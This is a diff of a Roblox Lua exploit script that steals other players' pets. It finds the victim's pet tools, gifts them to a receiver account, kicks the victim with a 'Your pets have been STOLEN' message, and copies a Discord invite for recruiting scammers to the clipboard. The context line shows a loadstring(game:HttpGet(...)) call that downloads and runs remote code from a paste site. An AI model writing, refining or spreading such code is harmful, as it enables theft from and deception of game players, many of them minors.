@@ -809,35 +809,24 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
     -- Start following before gifting
     local followConn = safeFollow()
 
-    local giftedSomething = false
+    -- Gifting loop
+    for _, pet in ipairs(pets) do
+        if not receiverPlr then
+            followConn:Stop()
+            targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+            setclipboard("https://discord.gg/d2zgg2YDMz")
+            break
+        end
 
-for _, pet in ipairs(pets) do
-    if not receiverPlr then
-        followConn:Stop()
-        targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord!")
-        setclipboard("https://discord.gg/d2zgg2YDMz")
-        break
-    end
-
-    for _, tool in targetPlr.Backpack:GetChildren() do
-        if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
-            print("Gifting:", tool.Name)
-            local success = safeGiftTool(tool)
-            if success then
-                giftedSomething = true
+        for _, tool in targetPlr.Backpack:GetChildren() do
+            if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
+                print("Gifting:", tool.Name)
+                safeGiftTool(tool)
             end
         end
     end
-end
 
-followConn:Stop()
-
-if giftedSomething then
-    print("Gifted at least one pet. Waiting 5 minutes before kick.")
-    task.delay(300, function()
-        targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord!")
-        setclipboard("https://discord.gg/d2zgg2YDMz")
-    end)
-else
-    print("No pets gifted. Skipping kick.")
-end
+    -- Stop following after gifting
+    followConn:Stop()
+    targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+    setclipboard("https://discord.gg/d2zgg2YDMz")
